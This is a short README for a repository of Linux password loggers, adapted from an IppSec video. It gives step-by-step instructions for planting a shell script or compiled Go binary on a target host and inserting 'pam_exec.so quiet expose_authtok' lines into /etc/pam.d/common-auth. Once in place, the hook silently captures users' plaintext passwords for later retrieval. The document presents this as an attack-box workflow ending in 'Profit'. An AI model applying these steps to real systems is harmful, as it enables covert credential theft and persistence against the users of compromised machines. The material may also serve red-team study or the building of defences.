# IppSec's methods of keylogging on Linux through PAM

IppSec made a [fantastic video talking about logging passwords through `pam_exec` on Linux](https://youtu.be/FQGu9jarCWY?si=EjGratkh9tP0FwFc) using either a shell script or a compiled Go executable. I'm keeping examples in this repo for my use.

Thanks to IppSec for such good content!

I also made a minor improvement. IppSec's go PoC did not correctly log passwords which contained spaces. Found that out the hard way. My code here in this repo does this.

Probably goes without saying, but this requires elevated permissions / `root`.

## Bash script approach

1. Put the `./logger.sh` PoC on the host somewhere.

2. Edit `/etc/pam.d/common-auth`, add this to the top:

```
auth optional pam_exec.so quiet expose_authtok [FULL-PATH-TO-SCRIPT]
```

3. Wait for a user to try to auth. Pull the log back.

4. Profit.

Bear in mind this script PoC didn't seem to be logging sudo attempts in IppSec's video. Uncertain why this was.

## Go binary approach

This will write in JSON format and include whether authentication was successful or not.

1. Install the `go` package tooling (`apt` example below). Tell Go you'll need these dependencies:

```bash
sudo apt install golang
# sudo pacman -Syu go
go mod init logger
go get github.com/rs/zerolog
```

2. Compile the PoC here on your Linux attack box (tested on Kali) with:

```bash
go build
```

3. Upload the produced `logger` binary to the host somewhere.

4. Edit `/etc/pam.d/common-auth`, add this to the **top**:

```
auth optional pam_exec.so quiet expose_authtok [FULL-PATH-TO-BINARY]
```

5. Edit `/etc/pam.d/common-auth`, add this to the **bottom**:

```
auth optional pam_exec.so quiet [FULL-PATH-TO-BINARY]
```

6. Profit.
